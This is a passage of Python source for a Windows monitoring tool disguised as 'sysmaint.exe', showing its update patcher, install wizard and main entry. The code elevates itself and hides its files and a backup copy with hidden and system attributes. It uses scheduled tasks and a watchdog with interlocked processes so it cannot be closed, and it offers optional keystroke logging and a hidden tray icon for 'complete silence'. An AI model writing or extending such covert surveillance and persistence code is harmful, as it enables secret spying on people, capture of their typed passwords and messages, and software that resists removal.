    # 注意：删目录后不能再调用 log()，否则会在已删除的 CONFIG_DIR 里重建日志，
    # 导致备份目录“复活”。完成日志必须在删除之前写。
    log("卸载器：进程已清空，开始删除目录")
    # 3. 删除程序目录与备份/配置目录（重试，等待句柄彻底释放）
    for _ in range(20):
        force_remove(PRIMARY_DIR)
        force_remove(BACKUP_DIR)
        if not os.path.exists(PRIMARY_DIR) and not os.path.exists(BACKUP_DIR):
            break
        time.sleep(1)
    # 4. 自删除改名副本（独立批处理，父进程退出后继续，兼容作业限制）
    _spawn_self_delete(sys.executable)


# ============================================================
# 升级补丁（以临时改名副本运行，taskkill /IM sysmaint.exe 不会命中自身）
# ============================================================
def _replace_exe(src, dst, dstdir):
    """用 src 覆盖 dst，等待旧句柄释放；完成后重设隐藏+系统属性，按大小校验。"""
    try:
        os.makedirs(dstdir, exist_ok=True)
        src_size = os.path.getsize(src)
        done = False
        for _ in range(25):
            try:
                if os.path.exists(dst):
                    _k32.SetFileAttributesW(dst, FILE_ATTRIBUTE_NORMAL)
                shutil.copy2(src, dst)
                done = True
                break
            except Exception:
                # 目标仍被锁：先改名挪开再复制
                try:
                    old = dst + ".old"
                    if os.path.exists(old):
                        force_remove(old)
                    os.rename(dst, old)
                    shutil.copy2(src, dst)
                    force_remove(old)
                    done = True
                    break
                except Exception:
                    time.sleep(1)
        if not done:
            # 兜底：登记为重启后由系统完成替换
            try:
                if os.path.exists(dst):
                    _k32.MoveFileExW(dst, dst + ".old", MOVEFILE_DELAY_UNTIL_REBOOT)
                _k32.MoveFileExW(src, dst, MOVEFILE_DELAY_UNTIL_REBOOT)
            except Exception:
                pass
            return False
        set_hidden_system(dstdir)
        set_hidden_system(dst)
        return os.path.exists(dst) and os.path.getsize(dst) == src_size
    except Exception as e:
        log(f"替换程序失败 {dst}: {e}")
        return False


def patcher_main():
    """补丁主流程：停任务→清旧进程→替换主/备份副本→同步启动器→重启主程序。"""
    log("升级补丁开始执行")
    # 未安装（无配置）：直接转安装向导
    if not os.path.exists(CONFIG_FILE):
        log("未检测到已安装配置，转安装向导")
        ctypes.windll.user32.MessageBoxW(0, "未检测到已安装版本，即将打开安装向导。", APP_NAME, 0x40)
        spawn_detached(sys.executable)
        _spawn_self_delete(sys.executable)
        return
    try:
        cfg = load_config()
    except Exception:
        cfg = DEFAULT_CONFIG.copy()

    # 1. 删除两个计划任务，防止补丁过程被看门狗/登录任务拉起
    _delete_task(TASK_AUTO)
    _delete_task(TASK_WATCH)

    # 2. 结束所有旧版本进程（补丁已改名，/IM sysmaint.exe 不会命中自身）
    stable = 0
    for _ in range(30):
        subprocess.run(['taskkill', '/F', '/T', '/IM', APP_EXE_NAME],
                       capture_output=True, creationflags=CREATE_NO_WINDOW)
        time.sleep(1)
        if _count_named_processes() == 0:
            stable += 1
            if stable >= 3:
                break
        else:
            stable = 0
    time.sleep(2)

    # 3. 用补丁内置的新版本同时覆盖主副本与备份副本（二者曾被互锁，必须在进程清空后）
    src = sys.executable
    ok_primary = _replace_exe(src, PRIMARY_EXE, PRIMARY_DIR)
    ok_backup = _replace_exe(src, BACKUP_EXE, BACKUP_DIR)

    # 4. 清当日暂停标志，按原配置重建/同步启动器（两个计划任务）
    clear_pause_flag()
    auto = bool(cfg.get("autostart", True)) and not service_disabled()
    setup_autostart(auto)
    setup_watchdog(auto and bool(cfg.get("watchdog", False)))

    # 5. 启动新版主进程（它会再拉起守护、校正任务、执行保留期清理）
    started = False
    if ok_primary:
        started = spawn_detached(PRIMARY_EXE, ["--silent"])
    elif ok_backup:
        started = spawn_detached(BACKUP_EXE, ["--silent"])

    all_ok = ok_primary and ok_backup and started
    log(f"升级补丁完成 primary={ok_primary} backup={ok_backup} started={started}")
    msg = (f"更新完成，后台服务已重启。\n主程序：{'成功' if ok_primary else '失败'}\n"
           f"备份：{'成功' if ok_backup else '失败'}\n启动：{'成功' if started else '失败'}")
    if not all_ok:
        msg += "\n\n部分步骤未即时完成，重启电脑后会自动收尾，请重启一次。"
    ctypes.windll.user32.MessageBoxW(0, msg, APP_NAME, 0x40 if all_ok else 0x30)
    _spawn_self_delete(sys.executable)


# ============================================================
# 安装向导（首次运行 / 新电脑）
# ============================================================
class InstallWizard(QMainWindow):
    def __init__(self, on_done=None):
        super().__init__()
        self.on_done = on_done
        self.setWindowTitle(APP_NAME)
        screen = QApplication.primaryScreen().availableGeometry()
        self.resize(560, min(720, int(screen.height() * 0.9)))
        self.setMinimumSize(480, 500)
        self._init_ui()

    def _init_ui(self):
        central = QWidget(); self.setCentralWidget(central)
        outer = QVBoxLayout(central); outer.setContentsMargins(16, 16, 16, 16)
        scroll = QScrollArea(); scroll.setWidgetResizable(True)
        body = QWidget(); lay = QVBoxLayout(body); lay.setSpacing(10)

        title = QLabel(APP_NAME + " 安装配置"); title.setStyleSheet("font-size:18px;font-weight:bold;")
        lay.addWidget(title)
        lay.addWidget(QLabel("按步骤完成配置，约1分钟。"))

        g1 = QGroupBox("第一步：程序安装位置")
        l1 = QVBoxLayout()
        self.install_dir = QLabel(PRIMARY_DIR); self.install_dir.setWordWrap(True); self.install_dir.setStyleSheet("color:#666;")
        b1 = QPushButton("浏览..."); b1.setFixedWidth(80); b1.clicked.connect(self._browse_install)
        r1 = QHBoxLayout(); r1.addWidget(self.install_dir, 1); r1.addWidget(b1); l1.addLayout(r1)
        g1.setLayout(l1); lay.addWidget(g1)

        g2 = QGroupBox("第二步：数据保存位置")
        l2 = QVBoxLayout()
        default_data = os.path.join(os.environ.get("USERPROFILE", os.path.expanduser("~")), "Documents")
        self.video_dir = QLabel(default_data); self.video_dir.setWordWrap(True); self.video_dir.setStyleSheet("color:#666;")
        b2 = QPushButton("浏览..."); b2.setFixedWidth(80); b2.clicked.connect(self._browse_video)
        r2 = QHBoxLayout(); r2.addWidget(self.video_dir, 1); r2.addWidget(b2); l2.addLayout(r2)
        g2.setLayout(l2); lay.addWidget(g2)

        g3 = QGroupBox("第三步：设置管理密码")
        l3 = QVBoxLayout()
        self.p1 = QLineEdit(); self.p1.setEchoMode(QLineEdit.Password); self.p1.setPlaceholderText("输入密码（至少4位）"); l3.addWidget(self.p1)
        self.p2 = QLineEdit(); self.p2.setEchoMode(QLineEdit.Password); self.p2.setPlaceholderText("再次输入密码"); l3.addWidget(self.p2)
        g3.setLayout(l3); lay.addWidget(g3)

        g4 = QGroupBox("防护选项")
        l4 = QVBoxLayout()
        self.cb_autostart = QCheckBox("开机自动静默运行"); self.cb_autostart.setChecked(True); l4.addWidget(self.cb_autostart)
        self.cb_watchdog = QCheckBox("防关闭保护（双进程互锁+看门狗，推荐）"); self.cb_watchdog.setChecked(True); l4.addWidget(self.cb_watchdog)
        self.cb_keylog = QCheckBox("记录键盘输入（保存为TXT）"); self.cb_keylog.setChecked(False); l4.addWidget(self.cb_keylog)
        self.cb_hidetray = QCheckBox("隐藏托盘图标（完全静默）"); self.cb_hidetray.setChecked(False); l4.addWidget(self.cb_hidetray)
        g4.setLayout(l4); lay.addWidget(g4); lay.addStretch()

        scroll.setWidget(body); outer.addWidget(scroll, 1)
        btn = QPushButton("安装并启动")
        btn.setMinimumHeight(44)
        btn.setStyleSheet("background-color:#2d8cf0;color:white;font-size:16px;border-radius:4px;font-weight:bold;")
        btn.clicked.connect(self._install); outer.addWidget(btn)

    def _browse_install(self):
        p = QFileDialog.getExistingDirectory(self, "选择安装文件夹", PRIMARY_DIR)
        if p:
            self.install_dir.setText(p)

    def _browse_video(self):
        p = QFileDialog.getExistingDirectory(self, "选择数据保存位置")
        if p:
            self.video_dir.setText(p)

    def _install(self):
        install_dir = self.install_dir.text().strip()
        target_exe = os.path.join(install_dir, APP_EXE_NAME)  # 文件名固定中性
        video_dir = self.video_dir.text().strip()
        pwd1, pwd2 = self.p1.text(), self.p2.text()

        if not install_dir:
            QMessageBox.warning(self, "错误", "安装位置无效"); return
        if not (os.path.isdir(install_dir) or os.path.isdir(os.path.dirname(install_dir))):
            QMessageBox.warning(self, "错误", "安装位置的父目录不存在"); return
        if not os.path.isdir(video_dir):
            QMessageBox.warning(self, "错误", "数据保存目录不存在"); return
        if len(pwd1) < 4:
            QMessageBox.warning(self, "错误", "密码至少4位"); return
        if pwd1 != pwd2:
            QMessageBox.warning(self, "错误", "两次密码不一致"); return

        os.makedirs(install_dir, exist_ok=True)
        errors = []
        config = None

        # 1. 复制本体到安装位置（与备份目录彻底分离，避免自锁 Errno13）
        try:
            if getattr(sys, 'frozen', False):
                if os.path.normpath(target_exe) != os.path.normpath(sys.executable):
                    shutil.copy2(sys.executable, target_exe)
            set_hidden_system(target_exe)
        except Exception as e:
            errors.append(f"复制程序失败: {e}")

        # 2. 写配置
        try:
            h, salt = hash_password(pwd1)
            config = DEFAULT_CONFIG.copy()
            config["save_path"] = video_dir
            config["password_hash"] = h
            config["password_salt"] = salt
            config["autostart"] = self.cb_autostart.isChecked()
            config["watchdog"] = self.cb_watchdog.isChecked()
            config["keylog"] = self.cb_keylog.isChecked()
            config["hide_tray"] = self.cb_hidetray.isChecked()
            config["hide_folder"] = True
            save_config(config)
        except Exception as e:
            errors.append(f"写入配置失败: {e}")

        # 3. 建立隐藏备份（独立目录）
        try:
            if getattr(sys, 'frozen', False):
                os.makedirs(BACKUP_DIR, exist_ok=True)
                if os.path.normpath(target_exe) != os.path.normpath(BACKUP_EXE):
                    shutil.copy2(target_exe if os.path.exists(target_exe) else sys.executable, BACKUP_EXE)
                set_hidden_system(BACKUP_DIR); set_hidden_system(BACKUP_EXE)
        except Exception as e:
            errors.append(f"建立备份失败: {e}")

        # 4. 任务计划（都指向守护进程）
        try:
            if config:
                setup_autostart(config.get("autostart", True))
                # 看门狗仅在允许开机自启时建立，否则会变相开机自启
                setup_watchdog(config.get("autostart", True) and config.get("watchdog", False))
        except Exception as e:
            errors.append(f"设置任务计划失败: {e}")

        # 5. 启动主进程（主进程会再拉起守护进程，形成双进程互锁）
        try:
            if getattr(sys, 'frozen', False) and os.path.exists(target_exe):
                spawn_detached(target_exe, ["--silent"])
        except Exception as e:
            errors.append(f"启动失败: {e}")

        if errors:
            QMessageBox.warning(self, "部分步骤失败", "\n".join(errors))
        else:
            QMessageBox.information(self, "完成",
                                    "安装完成，服务已在后台运行。\n本窗口关闭后即可。\n\n"
                                    f"程序目录：{install_dir}\n数据目录：{video_dir}")
            QApplication.quit()


# ============================================================
# 主入口
# ============================================================
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def main():
    global _ROLE_TOKEN
    if not is_admin():
        params = " ".join([f'"{a}"' for a in sys.argv])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
        return

    # 卸载器分支（独立改名进程，无界面）
    if "--uninstall" in sys.argv:
        uninstaller_main()
        return

    # 升级补丁分支：先把自身复制为改名副本再运行，否则会被 taskkill /IM 误杀
    if "--update" in sys.argv:
        if not getattr(sys, 'frozen', False):
            log("升级补丁仅在打包后可用")
            return
        if os.path.basename(sys.executable).lower() == APP_EXE_NAME.lower():
            try:
                tmp = os.path.join(os.environ.get("TEMP", "."),
                                   "~upd" + uuid.uuid4().hex[:6] + ".exe")
                shutil.copy2(sys.executable, tmp)
                spawn_detached(tmp, ["--update"])
            except Exception as e:
                log(f"补丁引导失败: {e}")
            return
        patcher_main()
        return

    # 守护进程分支（无界面）
    if "--guard" in sys.argv:
        run_guard()
        return

    silent = "--silent" in sys.argv
    app = QApplication(sys.argv)
    app.setQuitOnLastWindowClosed(False)

    log(f"启动 v4.2 silent={silent} PyAV={HAS_AV}")

    config = load_config()
    has_path = bool(config.get("save_path")) and os.path.isdir(config.get("save_path", ""))

    if not has_path:
        # 首次运行：安装向导（静默模式无配置则退出）
        if silent:
            log("静默模式但未配置，退出")
            return
        win = InstallWizard()
        win.show()
        sys.exit(app.exec())
        return

    # 已安装
    # 卸载进行中：主进程不启动
    if uninstall_requested():
        log("检测到卸载标志，主进程退出")
        return
    if silent:
        # 自动/守护拉起：已永久停用或当天已停止，则不再启动
        if service_disabled():
            log("服务已被一键终止（永久停用），静默启动取消")
            return
        if pause_active():
            log("当天已停止，静默启动取消")
            return
    else:
        # 用户主动双击运行：视为恢复服务，清除永久停用与当日暂停标志
        clear_disable()
        clear_pause_flag()

    # 已有实例在运行：通知其打开设置后退出（仅交互双击）
    existing = try_connect_existing()
    if existing:
        if not silent:
            existing.write(b"show_settings")
            existing.waitForBytesWritten(1000)
        existing.close()
        return

    # 内核级主进程单实例闸门（尽早注册，防止启动期被重复拉起）
    token = AliveEvent(EVT_MAIN)
    if token.already_exists:
        log("已有主进程，本实例退出")
        return
    _ROLE_TOKEN = token

    ensure_backup()
    TrayController(config)
    sys.exit(app.exec())


if __name__ == "__main__":
    main()
